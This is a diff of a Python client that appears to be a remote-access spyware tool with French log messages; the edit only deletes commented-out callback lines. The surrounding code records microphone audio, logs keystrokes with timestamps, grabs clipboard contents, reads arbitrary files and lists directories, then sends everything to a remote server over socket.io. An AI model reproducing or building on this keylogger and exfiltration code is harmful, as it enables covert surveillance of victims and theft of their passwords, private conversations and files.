@@ -70,7 +70,6 @@ def record_and_send_audio(sio, duration=10, user_id=None):
 
         audio_io.seek(0)
         audio_encoded = base64.b64encode(audio_io.read()).decode()
-        # callback({'audio': audio_encoded, 'user_id': user_id})
         sio.emit('audio_response', {'audio': audio_encoded, 'user_id': user_id})
         print("Audio envoyé")
     except Exception as e:
@@ -94,7 +93,6 @@ def record_and_send_keyboard_log(sio, duration=10, user_id=None):
         keyboard_events = keyboard.stop_recording()
         keyboard_log = [event.name for event in keyboard_events if event.event_type == 'down']
         keyboard_log = [f"{key} - {time.strftime('%d/%m/%Y %H:%M:%S')}" for key in keyboard_log]
-        # callback({'keyboard_log': keyboard_log, 'user_id': user_id})
         sio.emit('keyboard_response', {'keyboard_log': keyboard_log, 'user_id': user_id})
         print("Keylogger envoyé")
     except Exception as e:
@@ -107,7 +105,6 @@ def get_clipboard_content(sio, user_id=None):
         print("Récupération du clipboard...")
         clipboard_content = pyperclip.paste()
         if clipboard_content:
-            # callback({'clipboard_content': clipboard_content, 'user_id': user_id})
             sio.emit('clipboard_response', {'clipboard_content': clipboard_content, 'user_id': user_id})
             print("Contenu du clipboard envoyé au serveur.")
         else:
@@ -160,7 +157,6 @@ def download_file(sio, file_path, user_id):
             with open(file_path, 'rb') as file:
                 file_data = file.read()
                 file_encoded = base64.b64encode(file_data).decode()
-                # callback({'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                 sio.emit('file_response',
                          {'file': file_encoded, 'file_name': os.path.basename(file_path), 'user_id': user_id})
                 print("Fichier envoyé")
@@ -191,7 +187,6 @@ def list_dir(sio, dir_path):
                 elif os.path.isdir(file_path):
                     files_and_dirs.append({'name': file_name, 'type': 'dir'})
             files_and_dirs.append({'path': dir_path})
-            # callback({'directory_listing': files_and_dirs})
             sio.emit('directory_listing_response', {'directory_listing': files_and_dirs})
             print(f"Liste des fichiers et dossiers de {dir_path} envoyée")
         else:
